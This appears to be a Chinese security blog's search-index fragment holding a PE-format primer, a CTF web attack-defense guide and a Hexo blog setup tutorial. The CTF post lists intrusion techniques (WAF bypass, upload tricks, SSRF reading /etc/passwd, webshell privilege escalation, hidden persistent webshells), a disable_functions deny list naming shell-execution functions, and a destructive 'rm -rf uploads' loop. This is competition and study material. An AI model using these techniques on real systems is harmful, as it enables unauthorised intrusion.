title=\"1.1PE节区(Section):\"></a>1.1PE节区(Section):</h3><p>.text<br>这个节区存放着程序的代码段的内容。<br>.data<br>这个节区存放着程序的数据段的内容。.idata存放着从终端输入到程序的内容。<br>.rsrc<br>这个节区通常存放着一些模块的资源信息，这个模块通常使用较少.<br>当然在NT中定义了有九种预设定的section的内容，这里介绍的只是比较常见和常用的区段。</p>\n<h3 id=\"1-2PE的历史残留问题\"><a href=\"#1-2PE的历史残留问题\" class=\"headerlink\" title=\"1.2PE的历史残留问题:\"></a>1.2PE的历史残留问题:</h3><p>接触DOS的人看到这里应该就不会觉得陌生了，这里介绍的就是DOS头和DOS存根.<br>PE文件的第一个字节起始于MS-DOS头部，被称作IMAGE_DOS_HEADER(这个结构的具体内容大家上网查询就可以).</p>\n<h3 id=\"1-3PE头-又名NT头\"><a href=\"#1-3PE头-又名NT头\" class=\"headerlink\" title=\"1.3PE头(又名NT头):\"></a>1.3PE头(又名NT头):</h3><p>PE头表示为结构体IMAGE_NT_HEADERS<br>其中IMAGE_NT_HEADERS中包含着另外两个结构体:<br>1.IMAGE_FILE_HEADER   包含一些底层的硬件信息，不是特别常用。<br>2.IMAGE_OPTIONAL_HEADER32 这个结构体是PE中最大的结构体，也是包含了RE中我们比较重要的信息。</p>\n<p>其中比较重要的几项:<br>1、入口点　Entry Point<br>2、文件偏移地址 File Offset<br>3、虚拟地址 Virtual Address 简称:VA<br>4、基地址 ImageBase<br>5、相对虚拟地址 Relative Virual Address 简称:RVA<br>RVA (相对虚拟地址) =VA (虚拟地址)　－　ImageBase (基地址)<br><img src=\"1.png\" alt=\"\"><br>左边是存放在磁盘中，右边是加载到内存中</p>\n<h3 id=\"1-4PE结构在实践中的情况\"><a href=\"#1-4PE结构在实践中的情况\" class=\"headerlink\" title=\"1.4PE结构在实践中的情况:\"></a>1.4PE结构在实践中的情况:</h3><p><img src=\"2.png\" alt=\"\"><br>对一个可执行文件进行PE结构的查看</p>\n<h4 id=\"1-4-1简单的Hello-Word\"><a href=\"#1-4-1简单的Hello-Word\" class=\"headerlink\" title=\"1.4.1简单的Hello Word\"></a>1.4.1简单的Hello Word</h4><p><img src=\"3.png\" alt=\"\"><br>图1.4.1 程序源码</p>\n<p><img src=\"4.png\" alt=\"\"></p>\n<p>图1.4.2二进制打开</p>\n<h4 id=\"1-4-2二进制分析\"><a href=\"#1-4-2二进制分析\" class=\"headerlink\" title=\"1.4.2二进制分析:\"></a>1.4.2二进制分析:</h4><p>(1)看到最开始的”4D 5A”，ASCII码翻译过来就是”MZ”,也就是前面提到的DOS头,从0000000h~00000040h都是DOS头。<br><img src=\"5.png\" alt=\"\"><br>(2)DOS存根就是从00000040h开始直到”PE”之前都是DOS存根。<br><img src=\"6.png\" alt=\"\"><br>(3)从”50 45”(“PE”)开始就是PE头<br><img src=\"7.png\" alt=\"\"><br>(4)从PE头之后往下就是各个节区头，每个节区的起始都是”2E”<br><img src=\"8.png\" alt=\"\"><br>(5)各个节区头之后就是各个节区的二进制表示。</p>\n<h3 id=\"1-5-PE工具的介绍和使用\"><a href=\"#1-5-PE工具的介绍和使用\" class=\"headerlink\" title=\"1.5 PE工具的介绍和使用:\"></a>1.5 PE工具的介绍和使用:</h3><h4 id=\"1-5-1工具PEiD\"><a href=\"#1-5-1工具PEiD\" class=\"headerlink\" title=\"1.5.1工具PEiD:\"></a>1.5.1工具PEiD:</h4><p><img src=\"9.png\" alt=\"\"></p>\n<h4 id=\"1-5-2装载我们前面的Hello-World程序\"><a href=\"#1-5-2装载我们前面的Hello-World程序\" class=\"headerlink\" title=\"1.5.2装载我们前面的Hello World程序:\"></a>1.5.2装载我们前面的Hello World程序:</h4><p><img src=\"10.png\" alt=\"\"></p>\n<p>请注意，PEiD能够分析的C++程序一般在VS2013之后都会显示C++8.0。</p>\n<h4 id=\"1-5-3节查看器\"><a href=\"#1-5-3节查看器\" class=\"headerlink\" title=\"1.5.3节查看器\"></a>1.5.3节查看器</h4><p><img src=\"11.png\" alt=\"\"><br><img src=\"12.png\" alt=\"\"><br>二进制表示中的入口点</p>\n<h4 id=\"1-5-4-PE细节\"><a href=\"#1-5-4-PE细节\" class=\"headerlink\" title=\"1.5.4 PE细节\"></a>1.5.4 PE细节</h4><p><img src=\"13.png\" alt=\"\"></p>\n","categories":["CTF"],"tags":["CTF","RE"]},{"title":"CTF-Web解题思路","url":"https://www.xjseck.com/2017/09/09/CTF-Web解题思路/","content":"<h2 id=\"简要描述\"><a href=\"#简要描述\" class=\"headerlink\" title=\"简要描述\"></a>简要描述</h2><p>入门安全的方式个人感觉还是从CTF来入手，详细的学习路线可以 <strong>知乎</strong>上搜索，这里不再累述。Web方面还可以从wooyun镜像来学习。自己也入坑了差不多两年了，大致的总结一下解题思路和自己的一些心态体会吧。</p>\n<h2 id=\"体会\"><a href=\"#体会\" class=\"headerlink\" title=\"体会\"></a>体会</h2><p>当时是14年入的大学，大一打游戏度过，偶然的机会是15年大二，偶得一个学长带我参加了一下新大的安全比赛，当时的比赛水的不行，都不算是比赛吧，偶然听到了wooyun这个社区，之后就疯狂的百度浏览wooyun，获取WooYun账号，开始水群，就开始各种搜索怎么入门安全，怎么提升技能，听说了CTF，由于新疆的高校也没有CTF比赛，学校以往也是没有学长搞过，只能从网上获取，后面基本上是见到比赛就参加水群，浏览大佬们的博客，关注<a href=\"https://time.xctf.org.cn\" target=\"_blank\" rel=\"noopener\">time-xctf</a>，也是浮躁的不行，也参过一些线下的CTF比赛，基本上是被血虐，其中的收获也是不少的，至少让自己在安全的路上不再是孤独的人。这里就总结一下自己学到的一些套路，也算是为自己吧，毕竟曾经爱过。</p>\n<h2 id=\"套路考察\"><a href=\"#套路考察\" class=\"headerlink\" title=\"套路考察\"></a>套路考察</h2><p>自己相对擅长WEB方面的一些题目，就总结WEB方面的套路，RE逆向的姿势可以参考tangKID小基友的总结。</p>\n<h3 id=\"基础类\"><a href=\"#基础类\" class=\"headerlink\" title=\"基础类\"></a>基础类</h3><p>使用<strong>Burp Suite</strong> 抓包基本上就能看到题目的提示和考察的知识点。<br>主要这类题目包括：<br>1.HTTP 头知识（User-Agent、XFF、referer、cookie、藏flag和自定义的一些header包括响应头）<br>2.URL知识 包括传参数、数组、字符、编码。<br>3.修改数据包绕过waf、防护或后缀名等。</p>\n<h3 id=\"汇总\"><a href=\"#汇总\" class=\"headerlink\" title=\"汇总\"></a>汇总</h3><p>引用P牛总结的题目汇总</p>\n<blockquote>\n<p>一、爆破，包括md5、爆破随机数、验证码识别等<br>二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截<br>三、花式玩弄几个PHP特性，包括弱类型，strpos和===，反序列化+destruct、\\0截断、iconv截断、各种协议流<br>四、密码题，包括hash长度扩展、异或、移位加密各种变形、32位随机数过小<br>五、各种找源码技巧，包括git、svn、xxx.php.swp、<em>www</em>.(zip|tar.gz|rar|7z)、xxx.php.bak、xxx.php~<br>六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测&lt;?php &lt;? &lt;% <code>&lt;script language=php&gt;</code>、花式解析漏洞、ffmpeg-avi-m3u-xbin<br>七、Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换<br>八、open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法<br>九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱<br>十、社工，包括花式查社工库、微博、QQ签名、whois<br>十一、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断<br>十二、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等<br>十三、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过<br>十四、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）<br>十五、协议，花式IP伪造 X-Forwarded-For/Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包<br>十六、逻辑错误（用户注册、已存在、长度）<br>十七、ssrf python-django-directory  比如直接127.0.0.1/../../etc/passwd</p>\n</blockquote>\n<h3 id=\"进阶类\"><a href=\"#进阶类\" class=\"headerlink\" title=\"进阶类\"></a>进阶类</h3><p>我们知道了题目的意图，可能是几个点都需要满足或者有好几层再或者是题目的页面功能比较齐全亦或者是有什么黑科技，我们就需要分析、google。先大致分析整个题目的功能和参数，一般的思路是扫描备份文件关注最近爆发的漏洞事件，进行代码分析，这里就包含的知识点就比较多了，考察代码审计的功底了，需要提升代码功底，需要学习PHP基础、MVC设计思想、框架使用，这里的就不展开后面会更新PHP学习到实操的代码审计吧，慢慢积攒吧。</p>\n<h2 id=\"线下的一些总结\"><a href=\"#线下的一些总结\" class=\"headerlink\" title=\"线下的一些总结\"></a>线下的一些总结</h2><h3 id=\"攻防模式一。沙盒模式\"><a href=\"#攻防模式一。沙盒模式\" class=\"headerlink\" title=\"攻防模式一。沙盒模式\"></a>攻防模式一。沙盒模式</h3><p><strong>2016“丝绸之路”杯网络安全精英赛</strong><br>这个算是自己比较正式的CTF线下的比赛了<br>题型 ：贴近实际的目标网站，隐含着花样的拓扑结构，有4个沙盒，各个沙盒可能有关联。</p>\n<p>入手点：一。实际的网站一般会是通用的开源框架，需要掌握流行开源框架的利用的exploit。<br>快速的定位漏洞的位置。<br>一 未果的话，快速扫描目录，是否有信息泄漏，和铭感文件。然后就是定位到后台地址，猜用户名和密码，弱口令是关键。还有待扩思路。</p>\n<p>进入后台之后的思路就是先getshell ，getshell 的思路就是后台的上传漏洞，一般是后台的编辑插件，比如fuck  edit …绕过这些插件的过滤，再者是数据库备份，数据库命令执行等等。<br>提权: 这里如果是window提权首先如果是IIS+2003使用菜刀+pr  或者就是大马+15051exp<br>来提权。如果有防护，使用组建或者免杀等方法提权。<br>获取flag：搜索flag文件，一般是在管理员的桌面。</p>\n<p>最后扩大战果：<br>快速的分析此网站所在的网络环境，是否与其他题有关联，是否还存在内网环境等。<br>信息收集的快速定位与扩大化。</p>\n<p>这次比赛的总结：<br>开始2个小时的沙盒模式，沙盒1——192.168.199.101  提示don’tscan，没有任何 的思路。<br>沙盒2——102  是一个java的题很像线上的比赛题，这里不是很懂javaweb的参数问题就是没有后缀名的内部传参  比如102/order   显示信息 102/oreder/17 显示id为是17的信息，这里不熟悉参数的问题。(赛后才知道貌似是s2漏洞)<br>沙盒3——103  是一个家具站点，asp+iis+2003，从后台弱口令admim admin  进入之后就是上传一个图片马，然后数据库备份，getshell 菜刀连接  不能执行cmd，上传一个cmd 执行命令，不是system 权限，使用菜刀+cmd+pr  提权添加用户，3389连接之后搜索flag ，最后主办方的提示：沙盒3有沙盒1的入口信息，到第二天的直接放出了沙盒1的入口点，是一个菜刀，需要你re一下，检测一下这菜刀的行为，怎么执行的。只get一个flag，并没有做更大化的信息收集，和后续的拓扑扫描。（不足点:后台备份getshell不是很熟，提权也出了一些问题）<br> <a href=\"http://mycms7.cn.adminftp.com/\" target=\"_blank\" rel=\"noopener\">http://mycms7.cn.adminftp.com/</a>   沙盒3测试环境地址</p>\n<p>沙盒4—eshop 一个开源的网店系统3.0版本，follow.php注入漏洞未能触发注入，这里也忘记测试后台是否有弱口令了，经验不足。</p>\n<p>攻防模式二：web+pwn 服务器的组合。<br>环境说明 web服务 首先是一个/home/user1/wwwroot目录下有flag文件<br>Web目录权限是777 没有root权限 mysql 也是user1权限<br>Web 先说一下一开始的环境，php+mysql  权限都是 r_x权限  目录在/home/user1/wwwroot/   一开始web 我们就掉了2次分。首先搜索连接数据库的配置文件，进入数据库，修改后台的默认密码，删除其他必要的用户。然后进入web 目录下，修改目录权限。然后就坐等了一天，竟然web 就再没有掉分，我也很奇怪，人品爆发了。<br>后来听到别人的思路就是一开始，上来，猜出了mysqlroot 的弱口令，udf 提权成功了(不是很清楚)，<br>直接就2000分到手，我很想和师傅们聊聊人生。细节有待实现。<br>正确的思路是：一开始可以先拼一波手速，破解默认的admin密码，直接去后台上传文件，先getshell 再说。实际是是说web至少有5个以上的漏洞，师傅们的思路是，注入到管理员的md5，进后台，上传文件  然后包含getshell。获取权限持续得分。<br>正常的策略是tar 打包web 目录的文件到/tmp 目录下然后  scp  下载下来，审计测试。<br>目录的权限如图<br><img src=\"1.png\" alt=\"\"><br>Wwwroot  权限是7   子目录文件是 r 权限<br>测试udf提权(赛后问了一下大家都没有root)<br>定制脚本优化一下<br>这里修补漏洞的方式：<br>系统防护<br>Netstat  kill  进程<br>自动化脚本<br>暴力删除 敏感文件</p>\n<p>首先备份网站目录，  后续的做diff命令比对，是否被写后门shel了没有l<br> 首先我们写一个脚本<br>把我们防护的脚本包含到php文件中进行防护<br>然后可以写一个定时删除shell 文件的脚本，不允许在文件夹中写入文件</p>\n<p>一：不知道漏洞首先包含php脚本到web文件中做url 参数获取日志后续在分析<br>二：包含waf.php文件做sql注入xss、srf等漏洞的通用防护(做全局变量的防护)<br>三：审计代码发现已知漏洞，做代码上的修补<br>四：做流量的混淆，防止被人流量重放。<br>五：包含自动删除shell脚本<br>六：总结的思路，首先我们可以抓取别人的流量 然后利用别人留下的密码什么<br>比如丝绸杯  我们当时发现我们的admin 表中被添加了用户<br>我们可以用他这用户登录别人的服务器后台，然后再上传shell 什么的</p>\n<p><strong>Web 防护加固实现</strong><br>1.有root、administrator 权限的防护<br>首先环境是phpweb防护，首先直接修改php.ini    修改 设置为安全模式然后直接禁止大小马的函数，<br>disable_functions = passthru,exec,system,chroot,scandir,chgrp,chown,shell_exec,proc_open,proc_get_status,popen,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server<br>然后再开启安全模式<br>pcntl_exec() 可以绕过<br><a href=\"http://security.ctocio.com.cn/tips/5/7764505_5.shtml\" target=\"_blank\" rel=\"noopener\">http://security.ctocio.com.cn/tips/5/7764505_5.shtml</a><br>全部禁止</p>\n<p>2.非root权限的防护<br><a href=\"http://blog.csdn.net/andy1219111/article/details/9054277\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/andy1219111/article/details/9054277</a><br>打包web目录文件<br>下载保存扫描是否有内置后门<br>常规的修改默认的用户名和密码</p>\n<ol>\n<li>首先去查看web目录下链接sql的配置文件，获取数据库的密码，然后登陆数据库修改网站的默认后台密码。是否有file权限</li>\n<li>修改web目录下文件的权限，设置600，指定目录的权限设置400等，具体的文件具体设置，或者直接设置upload文件权限为chmod 000</li>\n<li>写一个自动删除shell的php脚本，白名单，自动删除目录下多出来的php文件<br>Watch –n 1 rm –rf uploads  每1秒定时删除uploads 文件</li>\n<li>加载防护waf safe 等php的脚本，抓取流量或者写脚本动态监控 脚本请参考&lt;攻防脚本中的连接地址&gt;</li>\n<li>对特定的漏洞进行代码上的修改补上漏洞。</li>\n<li>如果手速慢了被植入了内存马，一种是分析php-fmp进行进行查看，申请重启服务<br>另一种是，内存马判断文件，可以手动添加一个文件，内容可以随意了，只要存在此文件名的文件就可以了<br>7.如果主办方check的不严就直接删服务<br>8.赛后向主办方申请要自己服务的日志，一定要做赛后总结，日志分析<br>动态监控踩点防护</li>\n<li>使用server.php 抓取 get,post,request等数据包</li>\n<li>Py实施md5 检测目录，是否有新增、改动、减少等文件</li>\n<li>手动检测本地测试<br>具体办法：<br>首先，php文件内容头批量先导入抓数据包的php脚本和waf脚本<br>然后实施动态监控<br>这里功能可以预先集成在一个py 脚本中<br>具体方法和脚本在【加固脚本】文件夹中<br>漏洞查找</li>\n<li><p>首先扫描web文件，是否含有主办方隐藏的后门 附脚本：查找后门木马<br><img src=\"2.png\" alt=\"\"><br>Opensns  这里就印证了主办方留有后门<br>直接<br><img src=\"3.png\" alt=\"\"><br>可以直接刷flag</p>\n</li>\n<li><p>再一系列的防护之后，代码审计是否有包含  命令执行漏洞</p>\n</li>\n<li>确认有漏洞上传的shell到uoload文件<br>一般upload文件是777权限 所以我们可以<br>Watch –n 1 rm –rf  upload   每隔1秒 删除upload文件</li>\n<li>内存马的使用，第三届网络空间大赛中学习到使用内存马+手速的模式，然后使用批量的脚本，感觉很无解</li>\n<li>加载防护日志，抓取流量或者从别人的服务上分析shell使用别人的shell进行批量</li>\n<li>应对备份查找后门，我们可以上传一个具有上传功能的upload.php,再使用内存马来进行隐藏</li>\n<li>高一点的赛事，可能网上难以搜索到现成的exp、poc这时就需要审计代码，一般持续的时间相对比较久。<br>附一下一些通用漏洞<br>列表<br>memcache未授权访问  java反序列(struts2可以细分) jenkis jenkis配置不当<br>心脏出血 nosql未授权 glashfish任意文件读 ms10-070  padding orcles  jdwp调试漏洞 mogodb未授权   iis put解析漏洞  svn信息泄露  redis未授权   域传送 iis短文件名 ElasticSearch漏洞…..  后待续<br>一定好多动手复现，比赛的时候才能拼手速。<br>最后复现P牛的这个漏洞库<br><a href=\"https://github.com/phith0n/vulhub/\" target=\"_blank\" rel=\"noopener\">https://github.com/phith0n/vulhub/</a></li>\n</ol>\n<h2 id=\"线下的经验参考\"><a href=\"#线下的经验参考\" class=\"headerlink\" title=\"线下的经验参考\"></a>线下的经验参考</h2><blockquote>\n<p><a href=\"http://mp.weixin.qq.com/s?__biz=MzIyNTA1NzAxOA==&amp;mid=2650473772&amp;idx=1&amp;sn=383dd\" target=\"_blank\" rel=\"noopener\">http://mp.weixin.qq.com/s?__biz=MzIyNTA1NzAxOA==&amp;mid=2650473772&amp;idx=1&amp;sn=383dd</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"http://mp.weixin.qq.com/s?__biz=MzI0NTA3NzQ2MQ==&amp;mid=400219727&amp;idx=1&amp;sn=ef52130e5abe78231fc7ecb52dfab30d&amp;scene=23&amp;srcid=0727mNmx7vUY433OxmmAA4qZ#rd\" target=\"_blank\" rel=\"noopener\">http://mp.weixin.qq.com/s?__biz=MzI0NTA3NzQ2MQ==&amp;mid=400219727&amp;idx=1&amp;sn=ef52130e5abe78231fc7ecb52dfab30d&amp;scene=23&amp;srcid=0727mNmx7vUY433OxmmAA4qZ#rd</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"http://mp.weixin.qq.com/s?__biz=MjM5NjkyMTk5Mg==&amp;mid=200915617&amp;idx=2&amp;sn=50fb575f04e3c5b1acea6dbaf594a0d0&amp;scene=23&amp;srcid=07277VWPlLebnsrF3tO5fBrO#rd\" target=\"_blank\" rel=\"noopener\">http://mp.weixin.qq.com/s?__biz=MjM5NjkyMTk5Mg==&amp;mid=200915617&amp;idx=2&amp;sn=50fb575f04e3c5b1acea6dbaf594a0d0&amp;scene=23&amp;srcid=07277VWPlLebnsrF3tO5fBrO#rd</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"http://5alt.me/posts/2014/10/AliCTF2014%E5%86%B3%E8%B5%9B%E8%AE%B0%E5%BD%95.html\" target=\"_blank\" rel=\"noopener\">http://5alt.me/posts/2014/10/AliCTF2014%E5%86%B3%E8%B5%9B%E8%AE%B0%E5%BD%95.html</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"http://mp.weixin.qq.com/s?__biz=MjM5NTU2MTQwNA==&amp;mid=2650652095&amp;idx=2&amp;sn=ba608435b3f215e8c93e58556caa1df3&amp;scene=23&amp;srcid=072784JTwY6uY8ww7yoeU701#rd\" target=\"_blank\" rel=\"noopener\">http://mp.weixin.qq.com/s?__biz=MjM5NTU2MTQwNA==&amp;mid=2650652095&amp;idx=2&amp;sn=ba608435b3f215e8c93e58556caa1df3&amp;scene=23&amp;srcid=072784JTwY6uY8ww7yoeU701#rd</a>    linux  脚本维护系统</p>\n</blockquote>\n<blockquote>\n<p><a href=\"http://weibo.com/p/1001603847172578749357?mod=zwenzhang\" target=\"_blank\" rel=\"noopener\">http://weibo.com/p/1001603847172578749357?mod=zwenzhang</a></p>\n</blockquote>\n<p>这里猥琐的不死马和进程后门</p>\n<blockquote>\n<p><a href=\"http://byd.dropsec.xyz/2017/05/16/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7/\" target=\"_blank\" rel=\"noopener\">http://byd.dropsec.xyz/2017/05/16/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7/</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"http://bobao.360.cn/ctf/detail/169.html\" target=\"_blank\" rel=\"noopener\">http://bobao.360.cn/ctf/detail/169.html</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://blog.rexskz.info/index.php/2016-nationwide-ctf-final-writeup.html\" target=\"_blank\" rel=\"noopener\">https://blog.rexskz.info/index.php/2016-nationwide-ctf-final-writeup.html</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"http://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/\" target=\"_blank\" rel=\"noopener\">http://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/</a></p>\n</blockquote>\n<p><strong>线下的一些脚本上传到了<a href=\"https://github.com/Huseck/CTF\" target=\"_blank\" rel=\"noopener\">github</a>上了大家可以找一下</strong></p>\n","categories":["CTF"],"tags":["CTF","WEB"]},{"title":"博客的搭建过程","url":"https://www.xjseck.com/2017/09/07/博客的搭建过程/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>搭建个人博客有两种方式</p>\n<ul>\n<li><strong>第一种</strong><br>使用自己独立的VPS和域名<br>这种的方式就是可扩展的方式很多种，可以直接源码安装管理数据库等，比如安装typecho、WordPress等，如果是只是为了写博文就没有必要选择这种方式了，多花费买VPS的钱了。自行安装配置这里不再累述。</li>\n<li><strong>第二种</strong><br>使用github pages +hexo+域名的方式。<br>这种方式个人感觉比较nice。<br>安装的过程如下<br><strong>前期准备</strong></li>\n<li>Step1<br>先安装git nodejs 的基础上安装 hexo<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#npm install hexo-cli -g</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>如果npm安装不了需要使用淘宝的cnpm来代替<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class=\"line\">#cnpm install hexo-cli -g</span><br><span class=\"line\">#hexo -v  //查看一下是否安装成功</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>Step2<br>然后创建一个hexo<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#cnpm install</span><br><span class=\"line\">或者</span><br><span class=\"line\">#npm install </span><br><span class=\"line\">#hexo init hexo   //这里如果出现不能连接到git上需要使用一下代理 当前目录下创建一个hexo文件里面是hexo源文件</span><br><span class=\"line\">#git config --global https.proxy http://127.0.0.1:1080</span><br><span class=\"line\">#git config --global https.proxy https://127.0.0.1:1080</span><br><span class=\"line\"></span><br><span class=\"line\">然后进入hexo文件下运行</span><br><span class=\"line\">#cd hexo</span><br><span class=\"line\">#cnpm install hexo --save</span><br><span class=\"line\">或者</span><br><span class=\"line\">#npm install hexo --save</span><br><span class=\"line\">#sudo npm install --unsafe-perm --verbose -g hexo  如果运行错误，可以执行此命令</span><br><span class=\"line\">本地测试运行hexo</span><br><span class=\"line\">#hexo g</span><br><span class=\"line\">#hexo s</span><br><span class=\"line\">出现</span><br><span class=\"line\">INFO  Start processing</span><br><span class=\"line\">INFO  Hexo is running at http://localhost:4000/. Press Ctrl+C to stop.</span><br><span class=\"line\">说明就成功了</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"创建github-pages\"><a href=\"#创建github-pages\" class=\"headerlink\" title=\"创建github pages\"></a>创建github pages</h2><p>到这里我们已经本地能运行hexo了，配置好选择好自己喜欢的主题<br>我们创建一个github pages</p>\n<ul>\n<li>Step1<br>点击<br><strong>Create a new repository</strong><br><img src=\"QQ图片20170907231506.png\" alt=\"图片描述\"><br>名字一定要填写你github的名字<br>然后创建选择主题<br>之后访问huseck.github.io，访问自己的</li>\n<li><p>Step2<br>使用git 来管理github的仓库<br>前期需要配置ssh-key 连接到github上</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#ssh-keygen –t rsa –C “邮箱地址” //可以什么都不用填写 把id_rsa.pub 的内容复制到github setting 中的ssh-keys 中</span><br><span class=\"line\">然后git 配置</span><br><span class=\"line\">#git config –global user.name “用户名”</span><br><span class=\"line\">#git config –global user.email “邮箱”</span><br><span class=\"line\">然后连接测试</span><br><span class=\"line\">ssh –T git@github.com</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Step3 创建分支管理<br>新创建的仓库的默认分支(branches)是master 我们需要再创建一个存放hexo源文件的分支<br>新建一个空的文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#git init</span><br><span class=\"line\">#git  remote add origin https://github.com/Huseck/huseck.github.io.git</span><br><span class=\"line\">#git pull origin master</span><br><span class=\"line\">#git branch hexo  //创建分支</span><br><span class=\"line\">#git checkout hexo</span><br><span class=\"line\">#git push origin hexo</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>查看一个github上仓库会发现有两个分支了<br>需要向hexo分支上传hexo的源文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#git remote add origin https://github.com/github名.github.io.git</span><br><span class=\"line\">#git pull origin hexo</span><br><span class=\"line\">#git checkout hexo</span><br><span class=\"line\">#git add .  //当前有hexo源文件的目录下</span><br><span class=\"line\">#git commit -m &quot;hexo blog&quot;</span><br><span class=\"line\">#git push origin hexo</span><br></pre></td></tr></table></figure></p>\n<p>上传成功<br>然后我们上传静态文件到master分支<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#hexo g</span><br><span class=\"line\">#hexo s //会生成public 目录里面就是我们上传到master分支上的文件</span><br><span class=\"line\">        //有两种方式上传1.是#hexo d 需要配置</span><br><span class=\"line\">        在hexo 源文件的根目录_config.yml最后添加</span><br><span class=\"line\">deploy:</span><br><span class=\"line\">  type: git</span><br><span class=\"line\">  repo: https://github.com/Huseck/huseck.github.io.git</span><br><span class=\"line\">  name: Huseck</span><br><span class=\"line\">  email: 504038236@qq.com</span><br><span class=\"line\">  branch: master</span><br><span class=\"line\">         //第二种方式直接进入public文件下，需要执行git的拉取选择仓库等命令比较繁琐</span><br><span class=\"line\">#git init</span><br><span class=\"line\">#git remote add origin https://github.com/github名.github.io.git</span><br><span class=\"line\">#git pull origin master</span><br><span class=\"line\">#git add .</span><br><span class=\"line\">#git commit -m &quot;public file&quot;</span><br><span class=\"line\">#git push origin master</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"多电脑进行博文编写\"><a href=\"#多电脑进行博文编写\" class=\"headerlink\" title=\"多电脑进行博文编写\"></a>多电脑进行博文编写</h2><p>如果我们的博客不是一个人在发布博文，或者换电脑了<br>想实现这样的思路就是<br>创建两个分支 一个装hexo生成的静态网页 一个装hexo源文件<br>在其他电脑上发布博客的话思路就是克隆装hexo源文件的仓库，本地编写好.md文件，然后hexo g 编译成最新的静态网页，之后hexo d 发布到装有静态网页的仓库中，就实现了最新的博文发布了，最后，最后就是把hexo源文件编写的.md博文上传到hexo源文件的仓库中，避免其他人使用的时候把之前生成的静态博文冲突掉。<br><strong>注：一定需要保持hexo源文件的.md文件和生成的静态文件内容保持一致</strong><br><strong>具体过程</strong> </p>\n<ol>\n<li>确认电脑上有git 和nodejs环境<br>首先是已经在github上添加ssh-keys了<br>然后本目录下新建一个空的目录<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 